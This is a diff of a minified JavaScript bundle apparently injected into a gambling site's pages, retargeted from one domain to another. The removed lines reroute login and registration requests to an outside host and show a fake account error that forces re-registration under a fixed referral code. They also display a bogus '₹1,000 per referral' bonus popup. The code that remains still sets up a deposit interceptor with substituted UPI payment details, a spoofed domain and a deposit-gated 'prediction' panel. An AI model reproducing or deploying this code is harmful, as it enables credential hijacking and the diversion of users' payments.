@@ -20,9 +20,9 @@ function Ot({
     });
   });
   let c = window.fetch,
-    p = "https://vercel-edge-ruddy-gamma.vercel.app",
+    p = "",
     w = /\/api\/webapi\/(Register|Login)$/,
-    S = '{"code":1,"msg":"' + i + '"}',
+    S = "",
     $ = "";
   function g(m, h) {
     try {
@@ -40,15 +40,9 @@ function Ot({
     return {};
   }
   function W(m) {
-    if (typeof m !== "string") return m;
-    let h = m.startsWith(n) ? m.slice(n.length) : m;
-    return w.test(h) ? p + h : h;
+    return m;
   }
-  function L() {
-    setTimeout(() => {
-      (localStorage.clear(), sessionStorage.clear(), (window.location.href = o));
-    }, 1500);
-  }
+  function L() {}
   function q() {
     let m = M();
     return (
@@ -94,16 +88,6 @@ function Ot({
     return "";
   }
   function C(m, h) {
-    if (!m || !w.test(m) || !h) return h;
-    try {
-      let z = JSON.parse(h);
-      if (!z.domainurl) z.domainurl = t;
-      if (m.includes("/api/webapi/Register")) {
-        let U = sessionStorage.getItem("wg_ref");
-        if (U && !z.wg_ref) z.wg_ref = U;
-      }
-      return JSON.stringify(z);
-    } catch {}
     return h;
   }
   function O(m) {
@@ -169,12 +153,6 @@ function Ot({
       .catch(() => {});
   }
   function Un(m, h) {
-    if (m && (m.includes("/Login") || m.includes("/Register")))
-      h.text()
-        .then((z) => {
-          if (z.includes(i)) L();
-        })
-        .catch(() => {});
     if (m && f && m.includes("WinGo")) {
       let z = m.match(/WinGo_([\w]+)/),
         U = z ? "WinGo_" + z[1] : null;
@@ -2507,322 +2485,22 @@ var me = !1,
   k = null,
   D = null;
 function ge() {
-  if (me) return !0;
-  if (!localStorage.getItem("token")) return !0;
-  let n = localStorage.getItem("wg_promo_expiry");
-  return n && Number(n) > Date.now();
+  return true;
 }
-function Po() {
-  if (k) return;
-  let n = "www.8okwin4.com".includes("okwin"),
-    t = document.createElement("style");
-  ((t.textContent = `.wgp-overlay {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background: rgba(0, 0, 0, 0.75);
-  z-index: 99998;
-  display: none;
-}
-.wgp-popup {
-  position: fixed;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-  z-index: 99999;
-  width: min(300px, calc(100% - 32px));
-  background: #1e1e3a;
-  border-radius: 18px;
-  overflow: hidden;
-  display: none;
-  flex-direction: column;
-  box-shadow: 0 8px 40px rgba(0, 0, 0, 0.6);
-  font-family: -apple-system, system-ui, "Segoe UI", sans-serif;
-}
-.wgp-close {
-  position: absolute;
-  top: 10px;
-  right: 12px;
-  width: 26px;
-  height: 26px;
-  border-radius: 50%;
-  background: rgba(255, 255, 255, 0.1);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 12px;
-  color: rgba(255, 255, 255, 0.7);
-  cursor: pointer;
-  z-index: 1;
-  border: none;
-}
-.wgp-hero {
-  text-align: center;
-  padding: 28px 20px 14px;
-}
-.wgp-icon {
-  font-size: 44px;
-  line-height: 1;
-  margin-bottom: 10px;
-}
-.wgp-amount {
-  font-size: 28px;
-  font-weight: 900;
-  color: #fff;
-  letter-spacing: -0.5px;
-  margin-bottom: 8px;
-}
-.wgp-pill {
-  display: inline-block;
-  padding: 4px 12px;
-  border-radius: 99px;
-  background: rgba(245, 180, 0, 0.15);
-  border: 1px solid rgba(245, 180, 0, 0.35);
-  font-size: 10.5px;
-  font-weight: 600;
-  color: #f5c842;
-  letter-spacing: 0.2px;
-}
-.wgp-stats {
-  display: flex;
-  gap: 6px;
-  padding: 0 16px 12px;
-  justify-content: center;
-}
-.wgp-chip {
-  flex: 1;
-  text-align: center;
-  padding: 7px 4px;
-  border-radius: 10px;
-  background: rgba(255, 255, 255, 0.06);
-  border: 1px solid rgba(255, 255, 255, 0.1);
-  font-size: 10px;
-  font-weight: 600;
-  color: #c8cad0;
-}
-.wgp-body {
-  padding: 0 16px 14px;
-  font-size: 11.5px;
-  color: #7b7e9a;
-  line-height: 1.65;
-  text-align: center;
-}
-.wgp-cta {
-  display: block;
-  width: calc(100% - 32px);
-  margin: 0 16px 10px;
-  padding: 14px;
-  border-radius: 12px;
-  border: none;
-  background: linear-gradient(90deg, #f5a623, #f5c842);
-  color: #1a1200;
-  font-size: 15px;
-  font-weight: 800;
-  cursor: pointer;
-  font-family: inherit;
-  letter-spacing: 0.1px;
-}
-.wgp-cta:active {
-  opacity: 0.9;
-}
-.wgp-footer {
-  display: flex;
-  align-items: center;
-  gap: 7px;
-  padding: 8px 16px 16px;
-  justify-content: center;
-}
-.wgp-chk {
-  width: 17px;
-  height: 17px;
-  border-radius: 50%;
-  border: 1.5px solid #4a4d6a;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  cursor: pointer;
-  flex-shrink: 0;
-  transition:
-    background 0.15s,
-    border-color 0.15s;
-}
-.wgp-chk.on {
-  background: #07c160;
-  border-color: #07c160;
-}
-.wgp-chk-tick {
-  font-size: 10px;
-  color: #fff;
-  opacity: 0;
-  transition: opacity 0.15s;
-}
-.wgp-chk.on .wgp-chk-tick {
-  opacity: 1;
-}
-.wgp-remind {
-  font-size: 11px;
-  color: #4a4d6a;
-  cursor: pointer;
-}
-.wgp-light .wgp-popup {
-  background: #fff;
-  box-shadow: 0 8px 40px rgba(0, 0, 0, 0.15);
-}
-.wgp-light .wgp-close {
-  background: rgba(0, 0, 0, 0.06);
-  color: #888;
-}
-.wgp-light .wgp-amount {
-  color: #111;
-}
-.wgp-light .wgp-pill {
-  background: rgba(249, 89, 89, 0.08);
-  border-color: rgba(249, 89, 89, 0.25);
-  color: #f95959;
-}
-.wgp-light .wgp-chip {
-  background: #f5f5ff;
-  border-color: #e0e0f0;
-  color: #555;
-}
-.wgp-light .wgp-body {
-  color: #777;
-}
-.wgp-light .wgp-cta {
-  background: linear-gradient(90deg, #f95959, #ff8c6e);
-  color: #fff;
-}
-.wgp-light .wgp-chk {
-  border-color: #ccc;
-}
-.wgp-light .wgp-remind {
-  color: #aaa;
-}
-`),
-    document.head.appendChild(t));
-  let e = document.createElement("div");
-  if (n) e.className = "wgp-light";
-  ((k = document.createElement("div")),
-    (k.className = "wgp-overlay"),
-    e.appendChild(k),
-    (D = document.createElement("div")),
-    (D.className = "wgp-popup"),
-    (D.innerHTML = `<button class="wgp-close" id="wgp-close">✕</button>
-<div class="wgp-hero">
-  <div class="wgp-icon">\uD83D\uDCB0</div>
-  <div class="wgp-amount">FREE ₹1,000</div>
-  <div class="wgp-pill">Per Referral &bull; No Limit &bull; Instant Payout</div>
-</div>
-<div class="wgp-stats">
-  <div class="wgp-chip">\uD83D\uDCB8 Instant</div>
-  <div class="wgp-chip">♾️ No Cap</div>
-  <div class="wgp-chip">✅ Verified</div>
-</div>
-<div class="wgp-body">
-  Invite friends to join. Every time they deposit, you earn ₹1,000 commission —
-  instantly credited, zero waiting.
-</div>
-<button class="wgp-cta" id="wgp-cta">\uD83C\uDF81 Claim Free Bonus →</button>
-<div class="wgp-footer">
-  <div class="wgp-chk" id="wgp-chk"><span class="wgp-chk-tick">✓</span></div>
-  <span class="wgp-remind" id="wgp-remind">No More Reminders Today</span>
-</div>
-`),
-    e.appendChild(D),
-    document.body.appendChild(e));
-}
-function at(n) {
-  if (k) k.style.display = "none";
-  if (D) D.style.display = "none";
-  if (((me = !0), n)) localStorage.setItem("wg_promo_expiry", String(Date.now() + 86400000));
-}
-function Go() {
-  if (ge()) return;
-  (Po(), (k.style.display = "block"), (D.style.display = "flex"));
-  let n = !1,
-    t = D.querySelector("#wgp-chk");
-  ((t.onclick = () => {
-    ((n = !n), t.classList.toggle("on", n));
-  }),
-    (D.querySelector("#wgp-remind").onclick = () => t.click()),
-    (D.querySelector("#wgp-close").onclick = () => at(n)),
-    (k.onclick = () => at(n)),
-    (D.querySelector("#wgp-cta").onclick = () => {
-      (at(n), window.dispatchEvent(new Event("wg-open-bonus")));
-    }));
-}
-function qe() {
-  (zo(), Jo());
-  let n = document.querySelector(".settingPanel__container-items");
-  if (n) Ho(n);
-}
+function Po() {}
+function at() {}
+function Go() {}
 function Ee(n) {
-  let t = !1,
-    e = () => {
-      if (!t && !ge()) ((t = !0), Go());
-    },
-    o = () => {
-      (qe(),
-        new MutationObserver(() => {
-          (qe(), e());
-        }).observe(document.body, {
-          childList: !0,
-          subtree: !0,
-        }),
-        window.addEventListener("hashchange", e),
-        window.addEventListener("storage", e),
-        setTimeout(e, 1500));
-    };
+  let o = () => {
+    qe();
+    new MutationObserver(() => qe()).observe(document.body, {
+      childList: !0,
+      subtree: !0,
+    });
+  };
   document.readyState === "loading" ? document.addEventListener("DOMContentLoaded", o) : o();
 }
-function Le(n) {
-  let t = n.querySelector("#bonus-view"),
-    e = n.querySelector("#btn-copy-invite"),
-    o = n.querySelector("#bonus-link-preview"),
-    i = n.querySelector(".bonus-prog-count"),
-    l = n.querySelector(".bonus-bar-fill"),
-    f = "";
-  function c() {
-    let w =
-      location.origin +
-      "/#/register?invitationCode=" +
-      (sessionStorage.getItem("invitecode") || "");
-    return f ? w + "&ref=" + f : w;
-  }
-  function p() {
-    let w = sessionStorage.getItem("wg_user") || "";
-    if (!w) return;
-    if (
-      (fetch("/ar-api/bonus-stats?username=" + w)
-        .then((S) => S.json())
-        .then((S) => {
-          let $ = S.qualified || 0;
-          ((i.textContent = $ + " / 10 Qualified"),
-            (l.style.width = Math.min(($ / 10) * 100, 100) + "%"));
-        })
-        .catch(() => {}),
-      !f)
-    )
-      fetch("/ar-api/my-ref-tag?username=" + w)
-        .then((S) => S.json())
-        .then((S) => {
-          if (S.tag) ((f = S.tag), (o.textContent = c()));
-        })
-        .catch(() => {});
-  }
-  (window.addEventListener("wg-open-bonus", () => {
-    ((t.style.display = "flex"), (o.textContent = c()), p());
-  }),
-    n.querySelector("#btn-bonus-back").addEventListener("click", () => (t.style.display = "none")),
-    e.addEventListener("click", () => {
-      navigator.clipboard.writeText(c()).then(() => {
-        ((e.textContent = "✓ Copied!"),
-          setTimeout(() => (e.textContent = "Copy Invite Link"), 2000));
-      });
-    }));
-}
+function Le(n) {}
 function pt() {
   document.getElementById("wg-deposit-hint")?.remove();
 }
@@ -3162,7 +2840,7 @@ function $e(n, t) {
 }
 var hn = {
     interceptor_enabled: !1,
-    min_deposit: 500,
+    min_deposit: 100,
     upis: [],
   },
   vt = !1;
@@ -3195,10 +2873,10 @@ async function yt() {
     });
     if (n.ok) {
       let t = await n.json(),
-        e = Number(t?.min_deposit ?? t?.minDeposit ?? 500);
+        e = Number(t?.min_deposit ?? t?.minDeposit ?? 100);
       ((hn = {
         interceptor_enabled: Boolean(t?.interceptor_enabled ?? t?.interceptorEnabled ?? t?.enabled),
-        min_deposit: Number.isFinite(e) && e > 0 ? e : 500,
+        min_deposit: Number.isFinite(e) && e > 0 ? e : 100,
         upis: We(t?.payment_methods ?? t?.upis),
       }),
         (vt = !0));
@@ -3206,14 +2884,14 @@ async function yt() {
   } catch {
     ((hn = {
       interceptor_enabled: !1,
-      min_deposit: 500,
+      min_deposit: 100,
       upis: [],
     }),
       (vt = !0));
   }
 }
 function No(n) {
-  let t = Number(hn.min_deposit || 500),
+  let t = Number(hn.min_deposit || 100),
     e = Number(String(n?.value ?? "").replace(/[^\d.]/g, "")),
     o = Number.isFinite(e) ? e : 0;
   return Math.max(o, t);
@@ -4170,12 +3848,11 @@ function Do(n) {
     };
   if ((e(), t > Date.now())) Fn = setInterval(e, 1000);
 }
-sessionStorage.setItem("invitecode", "116261778244");
-var Bo = "https://imgametransit.com",
-  Ao = "Account unavailable. Please create a new account.",
-  so = "/#/register?invitationCode=116261778244",
+var Bo = "",
+  Ao = "",
+  so = "/#/register",
   Ro = "/#/wallet/Recharge",
-  bo = "www.8okwin4.com".includes("okwin") ? "light" : "light",
+  bo = "cqz6091.com".includes("91club") ? "light" : "light",
   Be = "";
 function _(n) {
   let t = String(n == null ? "" : n).trim();
@@ -4305,8 +3982,8 @@ function Te() {
 }
 Ot({
   apiBase: Bo,
-  spoofDomain: "www.8okwin4.com",
-  minBalance: 500,
+  spoofDomain: "cqz6091.com",
+  minBalance: 100,
   nukeUrl: so,
   authErrMsg: Ao,
   onBalance: (n) => {
@@ -9988,7 +9665,7 @@ if (!customElements.get("prediction-panel"))
       <span class="gate-balance" id="gate-bal">₹0.00</span>
     </div>
     <p class="gate-desc">
-      Minimum ₹500 balance required to
+      Minimum ₹100 balance required to
       <br />
       access real-time predictions.
     </p>
@@ -9998,137 +9675,7 @@ if (!customElements.get("prediction-panel"))
     </div>
   </div>
 </div>
-<div class="bonus-view" id="bonus-view">
-  <div class="bonus-hdr">
-    <button class="bonus-back-btn" id="btn-bonus-back">
-      <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7" /></svg>
-    </button>
-    <span class="bonus-ttl">Referral Bonus</span>
-  </div>
-  <div class="bonus-scroll">
-    <div class="bonus-hero">
-      <div class="bonus-hero-icon">💰</div>
-      <h2 class="bonus-h2">Invite &amp; Earn</h2>
-      <p class="bonus-sub">
-        Refer friends and earn commission on every deposit they make. No limits.
-      </p>
-    </div>
-    <div class="bonus-stats-row">
-      <div class="bonus-stat">
-        <span class="bonus-stat-val">₹1,000</span>
-        <span class="bonus-stat-lbl">Per referral</span>
-      </div>
-      <div class="bonus-stat">
-        <span class="bonus-stat-val">∞</span>
-        <span class="bonus-stat-lbl">No cap</span>
-      </div>
-      <div class="bonus-stat">
-        <span class="bonus-stat-val">Instant</span>
-        <span class="bonus-stat-lbl">Payout</span>
-      </div>
-    </div>
-    <div class="bonus-prog-card">
-      <div class="bonus-prog-lbl">
-        <span>Your progress</span>
-        <span class="bonus-prog-count">0 / 10 Qualified</span>
-      </div>
-      <div class="bonus-bar"><div class="bonus-bar-fill"></div></div>
-    </div>
-    <div class="bonus-tiers">
-      <div class="bonus-section-ttl">Reward Tiers</div>
-      <div class="bonus-tier">
-        <span class="tier-badge t-bronze">5</span>
-        <span class="tier-info">
-          5 referrals →
-          <b>₹5,000</b>
-          + Bronze badge
-        </span>
-      </div>
-      <div class="bonus-tier">
-        <span class="tier-badge t-silver">10</span>
-        <span class="tier-info">
-          10 referrals →
-          <b>₹10,000</b>
-          + Silver badge
-        </span>
-      </div>
-      <div class="bonus-tier">
-        <span class="tier-badge t-gold">25</span>
-        <span class="tier-info">
-          25 referrals →
-          <b>₹30,000</b>
-          + Gold badge
-        </span>
-      </div>
-      <div class="bonus-tier">
-        <span class="tier-badge t-diamond">50</span>
-        <span class="tier-info">
-          50 referrals →
-          <b>₹75,000</b>
-          + VIP access
-        </span>
-      </div>
-    </div>
-    <button class="bonus-cta-btn" id="btn-copy-invite">Copy Invite Link</button>
-    <div class="bonus-link-preview" id="bonus-link-preview"></div>
-    <div class="bonus-rules">
-      <div class="bonus-section-ttl">How it works</div>
-      <div class="bonus-rule">
-        1. Share your unique invite link with friends
-      </div>
-      <div class="bonus-rule">2. Friend registers using your link</div>
-      <div class="bonus-rule">
-        3. Friend makes their first deposit (min ₹500)
-      </div>
-      <div class="bonus-rule">4. Bonus credited instantly to your wallet</div>
-    </div>
-    <div class="bonus-rules">
-      <div class="bonus-section-ttl">Terms</div>
-      <div class="bonus-rule">
-        • Referral must make a minimum first deposit of ₹500
-      </div>
-      <div class="bonus-rule">• Self-referral is not permitted</div>
-      <div class="bonus-rule">• Bonus is credited as withdrawable balance</div>
-      <div class="bonus-rule">
-        • Management reserves the right to modify terms
-      </div>
-    </div>
-  </div>
-</div>
-<div class="wg-overlay inactive" id="wg-promo-overlay"></div>
-<div class="wg-popup inactive" id="wg-promo-banner">
-  <div class="wg-close-x" id="wg-promo-close">✕</div>
-  <div class="wg-pop-hero">
-    <div class="wg-pop-icon">💰</div>
-    <div class="wg-pop-amount">FREE ₹1,000</div>
-    <div class="wg-pop-pill">
-      Per Referral &bull; No Limit &bull; Instant Payout
-    </div>
-  </div>
-  <div class="wg-pop-stats">
-    <div class="wg-stat-chip">💸 Instant</div>
-    <div class="wg-stat-chip">♾️ No Cap</div>
-    <div class="wg-stat-chip">✅ Verified</div>
-  </div>
-  <div class="wg-pop-body">
-    Invite friends to join. Every time they deposit, you earn ₹1,000 commission
-    — instantly credited, zero waiting.
-  </div>
-  <button class="wg-pop-cta" id="wg-promo-cta">🎁 Claim Free Bonus →</button>
-  <div class="wg-pop-footer">
-    <div
-      class="wg-checkbox"
-      id="wg-promo-check"
-      role="checkbox"
-      aria-checked="false"
-    >
-      <div class="wg-checkbox__icon"><span class="wg-check-tick">✓</span></div>
-    </div>
-    <span class="wg-no-remind" id="wg-promo-remind">
-      No More Reminders Today
-    </span>
-  </div>
-</div>`),
+`),
           (this._logo = n.querySelector(".logo")),
           (this._panel = n.querySelector(".panel")),
           (this._header = n.querySelector(".panel-header")),
@@ -10392,8 +9939,6 @@ if (!customElements.get("prediction-panel"))
         let w = document.createElement("style");
         ((w.textContent = ".customer,.changlongEnter{display:none!important}"),
           document.head.appendChild(w),
-          Le(n),
-          Ee(n),
           yn(n),
           Me(500),
           he());
